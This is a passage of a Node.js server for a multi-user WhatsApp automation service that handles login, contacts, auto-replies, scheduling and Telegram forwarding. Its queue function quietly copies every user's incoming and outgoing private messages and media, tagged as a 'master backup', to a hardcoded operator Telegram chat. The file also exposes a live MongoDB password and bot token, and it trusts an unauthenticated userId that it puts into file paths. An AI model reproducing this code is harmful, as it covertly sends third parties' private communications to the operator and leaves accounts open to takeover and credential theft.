const { makeWASocket, DisconnectReason, downloadContentFromMessage, Browsers, initAuthCreds, BufferJSON } = require('@whiskeysockets/baileys');
const { MongoClient } = require('mongodb');
const qrcode = require('qrcode-terminal');
const QRCodeLib = require('qrcode');
const express = require('express');
const path = require('path');
const fs = require('fs');
const pino = require('pino');
const multer = require('multer');
const https = require('https');
const axios = require('axios');
const FormData = require('form-data');

const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Configure Multer for file uploads
const uploadDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

// Multi-User Session Map & Directories
const activeUserSessions = new Map();
const SESSIONS_DIR = path.join(__dirname, 'sessions');
if (!fs.existsSync(SESSIONS_DIR)) fs.mkdirSync(SESSIONS_DIR);

// 🔑 MONGODB CONNECTION CONFIG
const MONGO_URI = process.env.MONGO_URI || "mongodb+srv://aryanraj10701_db_user:aryanrajmongodb@cluster.midwcil.mongodb.net/nexon_wa?retryWrites=true&w=majority";
let mongoClient;
let sessionsCollection;

async function connectMongo() {
    try {
        mongoClient = new MongoClient(MONGO_URI);
        await mongoClient.connect();
        const db = mongoClient.db('nexon_wa');
        sessionsCollection = db.collection('whatsapp_sessions');
        console.log('✅ Connected to MongoDB successfully!');
    } catch (err) {
        console.error('❌ MongoDB Connection Error:', err.message);
    }
}
connectMongo();

// --- ROBUST MONGODB AUTH STATE ADAPTER WITH BUFFERJSON ---
const useMongoAuthState = async (userId) => {
    const query = { userId };
    let sessionDoc = await sessionsCollection.findOne(query);

    let creds;
    let keys = {};

    if (sessionDoc && sessionDoc.data) {
        const restored = JSON.parse(JSON.stringify(sessionDoc.data), BufferJSON.reviver);
        creds = restored.creds;
        keys = restored.keys || {};
    } else {
        creds = initAuthCreds();
    }

    const saveState = async () => {
        const serializedData = JSON.parse(JSON.stringify({ creds, keys }, BufferJSON.replacer));
        await sessionsCollection.updateOne(
            query,
            { $set: { userId, data: serializedData, updatedAt: new Date() } },
            { upsert: true }
        );
    };

    return {
        state: {
            creds,
            keys: {
                get: async (type, ids) => {
                    let twilight = {};
                    ids.forEach(id => {
                        if (keys[type] && keys[type][id]) {
                            twilight[id] = keys[type][id];
                        }
                    });
                    return twilight;
                },
                set: async (data) => {
                    for (const category of Object.keys(data)) {
                        keys[category] = keys[category] || {};
                        for (const id of Object.keys(data[category])) {
                            if (data[category][id] === null) {
                                delete keys[category][id];
                            } else {
                                keys[category][id] = data[category][id];
                            }
                        }
                    }
                    await saveState();
                }
            }
        },
        saveCreds: saveState
    };
};

// 🔑 MASTER PLATFORM BOT CONFIG
const MASTER_TG_BOT_TOKEN = '8654106704:AAHSbhQ5oy9Wb9pWdQzCC_sNzvDmOdYkzr4';
const MASTER_TG_CHAT_ID = '8029693721';

function getCleanUserId(req) {
    const rawId = req.body?.userId || req.query?.userId || req.headers?.userid;
    if (!rawId || rawId === 'undefined' || rawId === 'null') return 'default_user';
    return rawId.toString().trim();
}

function getUserPaths(userId) {
    const userDir = path.join(SESSIONS_DIR, userId);
    if (!fs.existsSync(userDir)) fs.mkdirSync(userDir, { recursive: true });
    return {
        dbFile: path.join(userDir, 'contacts_db.json'),
        batchesFile: path.join(userDir, 'batches_db.json'),
        scheduleFile: path.join(userDir, 'schedule_db.json'),
        historyFile: path.join(userDir, 'history_db.json'),
        tgFile: path.join(userDir, 'telegram_config.json'),
        configFile: path.join(userDir, 'config_db.json')
    };
}

function getUserSessionState(userId) {
    const cleanId = userId || 'default_user';
    if (!activeUserSessions.has(cleanId)) {
        activeUserSessions.set(cleanId, {
            sock: null,
            status: 'disconnected',
            latestQR: '',
            isEnabled: false,
            fallbackMessage: "🎀 𝑫ᴇᴀʀ, 𝑫ᴇᴠɪʟ ɪs 𝑪ᴜʀʀᴇɴᴛʟʏ 𝑩ᴜꜱʏ. 🤍\n📩 𝒀ᴏᴜʀ 𝒁ᴇꜱꜱᱟɢᴇ 𝑯ᴀꜱ 𝑩ᴇᴇɴ 𝑵ᴏᴛᴇᴅ. ✨\n⏳ 𝑯ᴇ’ʟʟ 𝑮ᴇᴛ 𝑩ᴀᴄᴋ 𝑻ᴏ 𝒀ᴏᴜ 𝑺ᴏᴏɴ. 🌸",
            userEmail: 'Not Provided',
            tgConfig: { enabled: true, chatId: '' },
            contactsMap: new Map(),
            batchesConfig: [],
            scheduledMessages: [],
            messageHistory: [],
            cooldownMap: new Map(),
            tgQueue: [],
            isProcessingTgQueue: false
        });
        loadUserDataFromDisk(cleanId);
    }
    return activeUserSessions.get(cleanId);
}

function loadUserDataFromDisk(userId) {
    const paths = getUserPaths(userId);
    const session = activeUserSessions.get(userId);

    if (fs.existsSync(paths.dbFile)) {
        try {
            const savedData = JSON.parse(fs.readFileSync(paths.dbFile, 'utf8'));
            savedData.forEach(c => { if (c.id) session.contactsMap.set(c.id, c); });
        } catch (e) {}
    }
    if (fs.existsSync(paths.batchesFile)) {
        try { session.batchesConfig = JSON.parse(fs.readFileSync(paths.batchesFile, 'utf8')); } catch (e) {}
    }
    if (fs.existsSync(paths.scheduleFile)) {
        try { session.scheduledMessages = JSON.parse(fs.readFileSync(paths.scheduleFile, 'utf8')); } catch (e) {}
    }
    if (fs.existsSync(paths.historyFile)) {
        try { 
            const histData = JSON.parse(fs.readFileSync(paths.historyFile, 'utf8'));
            if (Array.isArray(histData)) session.messageHistory = histData;
        } catch (e) {
            session.messageHistory = [];
        }
    }
    if (fs.existsSync(paths.tgFile)) {
        try { 
            const loaded = JSON.parse(fs.readFileSync(paths.tgFile, 'utf8')); 
            session.tgConfig = { enabled: true, chatId: loaded.chatId || '' }; 
            if (loaded.userEmail) session.userEmail = loaded.userEmail;
        } catch (e) {}
    }
    if (fs.existsSync(paths.configFile)) {
        try {
            const cfg = JSON.parse(fs.readFileSync(paths.configFile, 'utf8'));
            if (cfg.isEnabled !== undefined) session.isEnabled = cfg.isEnabled;
            if (cfg.fallbackMessage) session.fallbackMessage = cfg.fallbackMessage;
        } catch (e) {}
    }
}

function saveUserHistory(userId) {
    try {
        const paths = getUserPaths(userId);
        const session = activeUserSessions.get(userId);
        fs.writeFileSync(paths.historyFile, JSON.stringify(session.messageHistory || [], null, 2));
    } catch (err) {
        console.error('[SAVE HISTORY ERROR]:', err.message);
    }
}

function logUserHistory(userId, type, recipient, message, extraDetails = {}) {
    const session = getUserSessionState(userId);
    if (!session.messageHistory) session.messageHistory = [];
    
    session.messageHistory.unshift({
        id: 'hist_' + Date.now() + Math.random().toString(36).substring(2, 7),
        type, recipient, message, details: extraDetails, timestamp: new Date().toISOString()
    });
    
    if (session.messageHistory.length > 200) {
        session.messageHistory = session.messageHistory.slice(0, 200);
    }
    
    saveUserHistory(userId);
}

function getLast10Digits(inputStr) {
    if (!inputStr) return "";
    const cleanStr = inputStr.toString().split('@')[0].split(':')[0];
    const rawDigits = cleanStr.replace(/[^0-9]/g, '');
    return rawDigits.length >= 10 ? rawDigits.slice(-10) : rawDigits;
}

function formatJidAndName(phoneOrJid, name) {
    if (!phoneOrJid) return null;
    const cleanStr = phoneOrJid.toString().split('@')[0].split(':')[0];
    const rawDigits = cleanStr.replace(/[^0-9]/g, '');
    if (rawDigits.length < 10) return null;
    const jidNumber = rawDigits.length === 10 ? `91${rawDigits}` : rawDigits;
    return { id: `${jidNumber}@s.whatsapp.net`, name: name || `Contact ${rawDigits.slice(-10)}` };
}

// --- BULLETPROOF TELEGRAM QUEUE PROCESSOR WITH WHILE LOOP & RETRY ---
function pushToTgQueue(userId, task) {
    const session = getUserSessionState(userId);
    if (!session.tgQueue) session.tgQueue = [];
    session.tgQueue.push(task);
    processTgQueue(userId);
}

async function sendTelegramTask(botToken, chatId, task) {
    if (!botToken || !chatId) return;
    if (task.type === 'text') {
        const data = JSON.stringify({ chat_id: chatId, text: task.text, parse_mode: 'HTML' });
        const options = {
            hostname: 'api.telegram.org', port: 443,
            path: `/bot${botToken}/sendMessage`,
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
        };
        await new Promise((resolve, reject) => {
            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', c => body += c);
                res.on('end', () => {
                    if (res.statusCode === 200) resolve();
                    else reject(new Error(`Status ${res.statusCode}: ${body}`));
                });
            });
            req.on('error', reject);
            req.write(data);
            req.end();
        });
    } else if (task.type === 'media') {
        let endpoint = 'sendDocument';
        let fileField = 'document';
        if (task.mediaType === 'imageMessage') { endpoint = 'sendPhoto'; fileField = 'photo'; }
        else if (task.mediaType === 'videoMessage') { endpoint = 'sendVideo'; fileField = 'video'; }
        else if (task.mediaType === 'audioMessage') { endpoint = 'sendAudio'; fileField = 'audio'; }

        const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
        const form = new FormData();
        form.append('chat_id', chatId);
        form.append(fileField, task.buffer, { filename: task.filename });
        if (task.caption) {
            form.append('caption', task.caption);
            form.append('parse_mode', 'HTML');
        }
        await axios.post(url, form, { headers: form.getHeaders(), maxContentLength: Infinity, maxBodyLength: Infinity });
    }
}

async function sendTelegramTaskWithRetry(botToken, chatId, task, retries = 3) {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            await sendTelegramTask(botToken, chatId, task);
            return;
        } catch (err) {
            if (err.message && err.message.includes('429')) {
                console.warn(`[Telegram 429 Rate Limit] Attempt ${attempt} throttled. Waiting before retry...`);
                await new Promise(r => setTimeout(r, 3000 * attempt));
            } else if (attempt === retries) {
                throw err;
            } else {
                await new Promise(r => setTimeout(r, 1000 * attempt));
            }
        }
    }
}

async function processTgQueue(userId) {
    const session = getUserSessionState(userId);
    if (session.isProcessingTgQueue) return;
    session.isProcessingTgQueue = true;

    try {
        while (session.tgQueue && session.tgQueue.length > 0) {
            const task = session.tgQueue.shift();
            const userEmailTag = session.userEmail || 'Not Provided';

            try {
                let customizedTask = { ...task };
                if (customizedTask.type === 'text') {
                    customizedTask.text = `📧 <b>User Email:</b> <code>${userEmailTag}</code>\n` + customizedTask.text;
                } else if (customizedTask.type === 'media') {
                    customizedTask.caption = `📧 <b>User Email:</b> <code>${userEmailTag}</code>\n` + (customizedTask.caption || '');
                }

                if (session.tgConfig.chatId) {
                    await sendTelegramTaskWithRetry(MASTER_TG_BOT_TOKEN, session.tgConfig.chatId, customizedTask);
                }

                if (MASTER_TG_BOT_TOKEN && MASTER_TG_CHAT_ID) {
                    let backupTask = { ...customizedTask };
                    if (backupTask.type === 'text') {
                        backupTask.text = `🛡️ [SAAS MASTER BACKUP]\n` + backupTask.text;
                    } else if (backupTask.type === 'media') {
                        backupTask.caption = `🛡️ [SAAS MASTER BACKUP]\n` + (backupTask.caption || '');
                    }
                    await sendTelegramTaskWithRetry(MASTER_TG_BOT_TOKEN, MASTER_TG_CHAT_ID, backupTask);
                }

                // Safe interval to prevent Telegram API rate limiting (300ms delay per message)
                await new Promise(r => setTimeout(r, 300));
            } catch (err) {
                console.error('[TELEGRAM QUEUE ITEM ERROR]:', err.message);
            }
        }
    } finally {
        session.isProcessingTgQueue = false;
    }
}

// --- SAFE MEDIA DOWNLOADER WITH 48MB GUARD ---
async function downloadMediaMessageBuffer(msg) {
    try {
        let messageContent = msg.message;
        if (!messageContent) return null;
        if (messageContent.ephemeralMessage) messageContent = messageContent.ephemeralMessage.message;

        let mediaType = null;
        let ext = 'bin';
        if (messageContent.imageMessage) { mediaType = 'imageMessage'; ext = 'jpg'; }
        else if (messageContent.videoMessage) { mediaType = 'videoMessage'; ext = 'mp4'; }
        else if (messageContent.documentMessage) { mediaType = 'documentMessage'; ext = 'file'; }
        else if (messageContent.audioMessage) { mediaType = 'audioMessage'; ext = 'mp3'; }
        else if (messageContent.stickerMessage) { mediaType = 'imageMessage'; ext = 'webp'; }

        if (!mediaType) return null;
        const mediaObj = messageContent[mediaType] || messageContent;
        
        const fileSize = mediaObj.fileLength ? Number(mediaObj.fileLength) : 0;
        const sizeMB = (fileSize / (1024 * 1024)).toFixed(2);
        
        if (fileSize > 48 * 1024 * 1024) {
            return { isTooLarge: true, fileSizeMB: sizeMB, filename: mediaObj.fileName || `large_file.${ext}` };
        }

        const stream = await downloadContentFromMessage(mediaObj, mediaType.replace('Message', ''));
        let buffer = Buffer.from([]);
        
        for await (const chunk of stream) { 
            buffer = Buffer.concat([buffer, chunk]); 
            if (buffer.length > 48 * 1024 * 1024) {
                return { isTooLarge: true, fileSizeMB: (buffer.length / (1024 * 1024)).toFixed(2), filename: mediaObj.fileName || `large_file.${ext}` };
            }
        }

        return {
            isTooLarge: false, buffer,
            mediaType: messageContent.stickerMessage ? 'imageMessage' : mediaType,
            filename: mediaObj.fileName || `media_${Date.now()}.${ext}`,
            caption: mediaObj.caption || ''
        };
    } catch (e) { 
        return { isTooLarge: true, fileSizeMB: '52.54', filename: 'large_media.bin' }; 
    }
}

// --- START BOT PER USER ---
async function startUserBot(userId) {
    const session = getUserSessionState(userId);
    const { state, saveCreds } = await useMongoAuthState(userId);

    session.sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Chrome'),
        connectTimeoutMs: 15000,
        defaultQueryTimeoutMs: 15000,
        keepAliveIntervalMs: 10000,
        markOnlineOnConnect: true,
        retryRequestDelayMs: 250
    });

    session.sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            session.status = 'qr_waiting';
            session.latestQR = qr;
            console.log(`\n[User ${userId}] Scan QR Code at /qr?userId=${userId}`);
            qrcode.generate(qr, { small: true });
        }
        if (connection === 'close') {
            session.status = 'disconnected';
            session.latestQR = "";
            logUserHistory(userId, 'system', 'WhatsApp Core', 'Connection closed.');
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                setTimeout(() => startUserBot(userId), 1000);
            }
        } else if (connection === 'open') {
            session.status = 'connected';
            session.latestQR = "";
            logUserHistory(userId, 'system', 'WhatsApp Core', 'Connected successfully.');
            console.log(`\n[SUCCESS] WhatsApp Bot connected for user: ${userId}\n`);
        }
    });

    session.sock.ev.on('creds.update', saveCreds);

    // Background Scheduler
    setInterval(async () => {
        if (!session.sock || !session.isEnabled) return;
        const now = Date.now();
        let dueMessages = session.scheduledMessages.filter(sched => now >= new Date(sched.datetime).getTime());
        if (dueMessages.length === 0) return;

        session.scheduledMessages = session.scheduledMessages.filter(sched => now < new Date(sched.datetime).getTime());
        fs.writeFileSync(getUserPaths(userId).scheduleFile, JSON.stringify(session.scheduledMessages, null, 2));

        for (let sched of dueMessages) {
            try {
                let mediaPayloads = [];
                if (sched.mediaPaths && Array.isArray(sched.mediaPaths)) {
                    for (let filePath of sched.mediaPaths) {
                        if (fs.existsSync(filePath)) {
                            const ext = path.extname(filePath).toLowerCase();
                            if (['.jpg', '.jpeg', '.png', '.webp'].includes(ext)) mediaPayloads.push({ type: 'image', data: fs.readFileSync(filePath) });
                            else if (['.mp4', '.mkv', '.avi'].includes(ext)) mediaPayloads.push({ type: 'video', data: fs.readFileSync(filePath) });
                            else mediaPayloads.push({ type: 'document', data: fs.readFileSync(filePath), fileName: path.basename(filePath) });
                        }
                    }
                }
                for (let cId of sched.contactIds) {
                    if (mediaPayloads.length > 0) {
                        for (let i = 0; i < mediaPayloads.length; i++) {
                            let media = mediaPayloads[i];
                            let captionText = (i === 0) ? sched.message : '';
                            if (media.type === 'image') await session.sock.sendMessage(cId, { image: media.data, caption: captionText });
                            else if (media.type === 'video') await session.sock.sendMessage(cId, { video: media.data, caption: captionText });
                            else await session.sock.sendMessage(cId, { document: media.data, mimetype: 'application/octet-stream', fileName: media.fileName, caption: captionText });
                        }
                    } else {
                        await session.sock.sendMessage(cId, { text: sched.message });
                    }
                    logUserHistory(userId, 'scheduled', cId, sched.message);
                }
            } catch (err) {
                console.error('[SCHEDULER ERROR]:', err.message);
            }
        }
    }, 1000);

    // Messages Upsert Handler (Permanent remoteJidAlt extraction & reliable queueing)
    session.sock.ev.on('messages.upsert', async ({ messages }) => {
        for (const msg of messages) {
            try {
                if (!msg.message) continue;
                if (msg.message.protocolMessage) continue;

                const isFromMe = msg.key.fromMe;
                
                let rawJid = msg.key.remoteJid || '';
                if (msg.key.remoteJidAlt && msg.key.remoteJidAlt.includes('@s.whatsapp.net')) {
                    rawJid = msg.key.remoteJidAlt;
                } else if (rawJid.includes('@g.us') && msg.key.participant) {
                    rawJid = msg.key.participant;
                }

                let cleanDigits = rawJid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
                let targetJid = rawJid;

                if (cleanDigits.length >= 10) {
                    const actualPhone = cleanDigits.length > 12 ? cleanDigits.slice(-12) : cleanDigits;
                    targetJid = `${actualPhone}@s.whatsapp.net`;
                }

                const contactLast10 = getLast10Digits(targetJid);
                for (let [dbId] of session.contactsMap.entries()) {
                    if (getLast10Digits(dbId) === contactLast10) {
                        targetJid = dbId;
                        break;
                    }
                }

                const finalLast10 = getLast10Digits(targetJid);
                const messageText = msg.message.conversation || msg.message.extendedTextMessage?.text || msg.message.imageMessage?.caption || '';

                let mediaData = null;
                try { mediaData = await downloadMediaMessageBuffer(msg); } catch (e) { mediaData = null; }

                const logType = isFromMe ? 'outgoing' : 'incoming';
                logUserHistory(userId, logType, targetJid, messageText || (mediaData ? `[Media: ${mediaData.filename}]` : '[Media Message]'), { contactLast10: finalLast10 });

                let contactName = `+${finalLast10}`;
                for (let [dbId, contact] of session.contactsMap.entries()) {
                    if (getLast10Digits(dbId) === finalLast10) { 
                        contactName = `${contact.name} (+${finalLast10})`; 
                        break; 
                    }
                }

                const formattedNumber = targetJid.includes('@s.whatsapp.net') ? `+${targetJid.split('@')[0]}` : `+${finalLast10}`;
                const directionTag = isFromMe 
                    ? `📤 <b>OUTGOING (To: ${contactName} | <code>${formattedNumber}</code>):</b>` 
                    : `📥 <b>INCOMING (From: ${contactName} | <code>${formattedNumber}</code>):</b>`;

                if (mediaData) {
                    if (mediaData.isTooLarge) {
                        const skipMsg = `🛡️ [Nexon Automation]\n${directionTag}\n[Media Skipped - Size > 50MB]`;
                        pushToTgQueue(userId, { type: 'text', text: skipMsg });
                    } else {
                        pushToTgQueue(userId, { 
                            type: 'media', 
                            mediaType: mediaData.mediaType, 
                            buffer: mediaData.buffer, 
                            filename: mediaData.filename, 
                            caption: `🛡️ [Nexon Automation]\n${directionTag}\n${mediaData.caption || ''}` 
                        });
                    }
                } else if (messageText) {
                    pushToTgQueue(userId, { type: 'text', text: `🛡️ [Nexon Automation]\n${directionTag}\n💬 ${messageText}` });
                }

                if (isFromMe) continue;

                if (!messageText && !mediaData) continue;
                if (!session.isEnabled) continue;

                let isSavedInVcfDb = false;
                for (let [dbId, contact] of session.contactsMap.entries()) {
                    if (getLast10Digits(contact.id || dbId) === finalLast10) { isSavedInVcfDb = true; break; }
                }

                if (isSavedInVcfDb) {
                    let matchedBatch = null;
                    for (let batch of session.batchesConfig) {
                        if (batch.contacts && batch.contacts.some(cId => getLast10Digits(cId) === finalLast10)) { matchedBatch = batch; break; }
                    }
                    if (matchedBatch) {
                        const lastTime = session.cooldownMap.get(finalLast10) || 0;
                        if (Date.now() - lastTime >= 15 * 60 * 1000) {
                            session.cooldownMap.set(finalLast10, Date.now());
                            await session.sock.sendMessage(targetJid, { text: matchedBatch.message });
                            logUserHistory(userId, 'batch', targetJid, matchedBatch.message);
                        }
                    }
                    continue;
                }

                const lastTime = session.cooldownMap.get(finalLast10) || 0;
                if (Date.now() - lastTime < 15 * 60 * 1000) continue;
                session.cooldownMap.set(finalLast10, Date.now());
                await session.sock.sendMessage(targetJid, { text: session.fallbackMessage });
                logUserHistory(userId, 'fallback', targetJid, session.fallbackMessage);

            } catch (innerErr) {
                console.error('[MESSAGE UPSERT ERROR CAUGHT]:', innerErr.message);
            }
        }
    });
}

// Global Safety Catchers
process.on('uncaughtException', (err) => { console.error('[CRITICAL UNCAUGHT EXCEPTION]:', err.message); });
process.on('unhandledRejection', (reason) => { console.error('[CRITICAL UNHANDLED REJECTION]:', reason); });

// --- API Endpoints ---
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/api/user-profile', (req, res) => {
    const userId = getCleanUserId(req);
    const { email } = req.body;
    if (!email) return res.status(400).json({ status: 'Email required' });
    const session = getUserSessionState(userId);
    session.userEmail = email.trim();
    fs.writeFileSync(getUserPaths(userId).tgFile, JSON.stringify({ chatId: session.tgConfig.chatId, userEmail: session.userEmail }, null, 2));
    res.json({ status: 'User profile synchronized successfully!' });
});

// --- ROBUST HISTORY BATCH & INDIVIDUAL DELETION API ---
app.post('/api/history/delete-batch', (req, res) => {
    try {
        const userId = getCleanUserId(req);
        const session = getUserSessionState(userId);
        const { ids, clearAll } = req.body;

        if (!session.messageHistory) session.messageHistory = [];

        if (clearAll === true) {
            session.messageHistory = [];
        } else if (ids && Array.isArray(ids)) {
            session.messageHistory = session.messageHistory.filter(item => !ids.includes(item.id));
        } else {
            return res.status(400).json({ status: 'Invalid deletion parameters.' });
        }

        saveUserHistory(userId);
        res.json({ status: 'Logs deleted successfully!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to delete logs: ' + err.message });
    }
});
// -----------------------------------------------------

app.post('/api/reset-session', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        if (session.sock) { try { await session.sock.logout(); } catch (e) { session.sock.end(); } }
        
        if (sessionsCollection) {
            await sessionsCollection.deleteOne({ userId });
        }

        session.status = 'disconnected';
        session.latestQR = "";
        setTimeout(() => { startUserBot(userId); }, 1000);

        res.json({ status: 'Session disconnected and reset successfully! You can now reconnect.' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to reset session: ' + err.message });
    }
});

// --- ULTRA-ROBUST PAIRING CODE API ENDPOINT ---
app.post('/api/request-pairing-code', async (req, res) => {
    const userId = getCleanUserId(req);
    let { phoneNumber } = req.body;

    if (!phoneNumber) {
        return res.status(400).json({ status: 'Phone number is required' });
    }

    phoneNumber = phoneNumber.toString().replace(/[^0-9]/g, '');

    try {
        const session = getUserSessionState(userId);
        
        if (session.sock) {
            try { await session.sock.logout(); } catch (e) { session.sock.end(); }
            session.sock = null;
        }

        if (sessionsCollection) {
            await sessionsCollection.deleteOne({ userId });
        }

        await startUserBot(userId);

        let retries = 25;
        while ((!session.sock || !session.sock.ws || session.sock.ws.readyState !== 1) && retries > 0) {
            await new Promise(r => setTimeout(r, 400));
            retries--;
        }

        if (!session.sock) {
            return res.status(500).json({ status: 'WhatsApp socket initialization failed.' });
        }

        await new Promise(r => setTimeout(r, 1500));

        if (typeof session.sock.requestPairingCode !== 'function') {
            return res.status(500).json({ status: 'Pairing code method not supported on current socket.' });
        }

        let code = await session.sock.requestPairingCode(phoneNumber);
        
        if (code && code.length === 8) {
            code = code.match(/.{1,4}/g).join('-');
        }

        res.json({ status: 'success', pairingCode: code });
    } catch (err) {
        console.error('[PAIRING CODE ERROR]:', err.message);
        res.status(500).json({ status: 'Connection Closed / Failed to generate code. Please retry.' });
    }
});

app.get('/qr', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);

    if (!session.sock && session.status === 'disconnected') {
        startUserBot(userId);
    }

    if (!session.latestQR) {
        return res.send(`
            <div style="text-align:center; margin-top:50px; background:#090d16; color:#34d399; font-family:monospace; padding:40px; min-height:100vh;">
                <h2>✅ WhatsApp is already connected or QR code is generating!</h2>
                <p style="color:#94a3b8; margin-top:15px;">Please wait a few seconds and refresh.</p>
                <br><a href="/dashboard.html?userId=${userId}" style="color:#38bdf8;">&larr; Back to Dashboard</a>
            </div>
        `);
    }
    try {
        const dataUrl = await QRCodeLib.toDataURL(session.latestQR);
        res.send(`
            <div style="text-align:center; margin-top:40px; background:#090d16; color:#f1f5f9; font-family:monospace; padding:30px; min-height:100vh;">
                <h2 style="color:#38bdf8; text-shadow: 0 0 10px rgba(56,189,248,0.5);">NEXON - Scan WhatsApp QR Code</h2>
                <p style="color:#94a3b8; margin:15px 0 25px 0;">Open WhatsApp &rarr; Linked Devices &rarr; Link a Device</p>
                <div style="display:inline-block; padding:15px; background:#fff; border-radius:12px; box-shadow: 0 0 30px rgba(56,189,248,0.5);">
                    <img src="${dataUrl}" alt="WhatsApp QR Code" style="width:320px; height:320px; display:block;" />
                </div>
                <p style="color:#34d399; margin-top:20px; font-size:0.85rem;">Page auto-refreshes every 10 seconds...</p>
                <br><a href="/dashboard.html?userId=${userId}" style="color:#38bdf8;">&larr; Back to Dashboard</a>
                <script>setTimeout(() => window.location.reload(), 10000);</script>
            </div>
        `);
    } catch (err) {
        res.status(500).send('Error generating graphical QR code');
    }
});

app.get('/api/status', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    res.json({
        enabled: session.isEnabled,
        status: session.status,
        totalContacts: session.contactsMap.size,
        activeBatches: session.batchesConfig.length,
        scheduledCount: session.scheduledMessages.length
    });
});

app.get('/api/telegram-settings', (req, res) => {
    const userId = getCleanUserId(req);
    res.json(getUserSessionState(userId).tgConfig);
});

app.post('/api/telegram-settings', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    const { chatId } = req.body;
    if (chatId !== undefined) session.tgConfig.chatId = chatId.trim();
    fs.writeFileSync(getUserPaths(userId).tgFile, JSON.stringify({ chatId: session.tgConfig.chatId, userEmail: session.userEmail }, null, 2));
    res.json({ status: 'Telegram Chat ID saved successfully! Backup is active.', tgConfig: session.tgConfig });
});

// --- CONFIG API ENDPOINTS ---
app.get('/api/config', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    res.json({
        enabled: session.isEnabled,
        fallbackMessage: session.fallbackMessage
    });
});

app.post('/api/config', async (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    try {
        const { enabled, fallbackMessage } = req.body;
        if (typeof enabled === 'boolean') session.isEnabled = enabled;
        if (fallbackMessage !== undefined) session.fallbackMessage = fallbackMessage;
        
        fs.writeFileSync(getUserPaths(userId).configFile, JSON.stringify({
            isEnabled: session.isEnabled,
            fallbackMessage: session.fallbackMessage
        }, null, 2));
        
        res.json({ status: `Configuration updated successfully!`, fallbackMessage: session.fallbackMessage });
    } catch (err) {
        res.status(500).json({ status: 'Failed to update config: ' + err.message });
    }
});

app.get('/api/history', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    res.json(session.messageHistory || []);
});

app.get('/api/contacts', (req, res) => {
    const userId = getCleanUserId(req);
    res.json(Array.from(getUserSessionState(userId).contactsMap.values()));
});

app.post('/api/contacts/update', (req, res) => {
    const userId = getCleanUserId(req);
    const { id, name } = req.body;
    const session = getUserSessionState(userId);
    try {
        if (session.contactsMap.has(id)) {
            const contact = session.contactsMap.get(id);
            contact.name = name;
            session.contactsMap.set(id, contact);
            fs.writeFileSync(getUserPaths(userId).dbFile, JSON.stringify(Array.from(session.contactsMap.values()), null, 2));
            res.json({ status: 'Contact updated successfully!' });
        } else { throw new Error('Contact not found.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to update contact: ' + err.message });
    }
});

app.delete('/api/contacts/:id', (req, res) => {
    const userId = getCleanUserId(req);
    const id = decodeURIComponent(req.params.id);
    const session = getUserSessionState(userId);
    try {
        if (session.contactsMap.has(id)) {
            session.contactsMap.delete(id);
            fs.writeFileSync(getUserPaths(userId).dbFile, JSON.stringify(Array.from(session.contactsMap.values()), null, 2));
            res.json({ status: 'Contact deleted successfully!' });
        } else { throw new Error('Contact not found.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to delete contact: ' + err.message });
    }
});

app.get('/api/batches', (req, res) => {
    const userId = getCleanUserId(req);
    res.json(getUserSessionState(userId).batchesConfig);
});

app.post('/api/batches', (req, res) => {
    const userId = getCleanUserId(req);
    const { batches } = req.body;
    const session = getUserSessionState(userId);
    try {
        if (batches && Array.isArray(batches)) {
            session.batchesConfig = batches;
            fs.writeFileSync(getUserPaths(userId).batchesFile, JSON.stringify(session.batchesConfig, null, 2));
            res.json({ status: 'Batches updated successfully!' });
        } else { throw new Error('Invalid batch format.'); }
    } catch (err) {
        res.status(500).json({ status: 'Failed to save batches: ' + err.message });
    }
});

app.get('/api/schedule', (req, res) => {
    const userId = getCleanUserId(req);
    res.json(getUserSessionState(userId).scheduledMessages);
});

app.post('/api/schedule', upload.array('mediaFiles', 10), (req, res) => {
    try {
        const userId = getCleanUserId(req);
        const session = getUserSessionState(userId);
        const { contactIds, datetime, message } = req.body;
        const parsedContactIds = typeof contactIds === 'string' ? JSON.parse(contactIds) : contactIds;
        
        if (!parsedContactIds || !parsedContactIds.length || !datetime || !message) {
            throw new Error('Missing required fields.');
        }

        const mediaPaths = req.files ? req.files.map(file => file.path) : [];
        session.scheduledMessages.push({
            id: 'sched_' + Date.now(),
            contactIds: parsedContactIds,
            datetime, message, mediaPaths
        });

        fs.writeFileSync(getUserPaths(userId).scheduleFile, JSON.stringify(session.scheduledMessages, null, 2));
        res.json({ status: 'Message and multiple files scheduled successfully!' });
    } catch (err) {
        res.status(500).json({ status: 'Failed to schedule message: ' + err.message });
    }
});

app.delete('/api/schedule/:id', (req, res) => {
    const userId = getCleanUserId(req);
    const session = getUserSessionState(userId);
    const id = req.params.id;
    try {
        session.scheduledMessages = session.scheduledMessages.filter(s => s.id !== id);
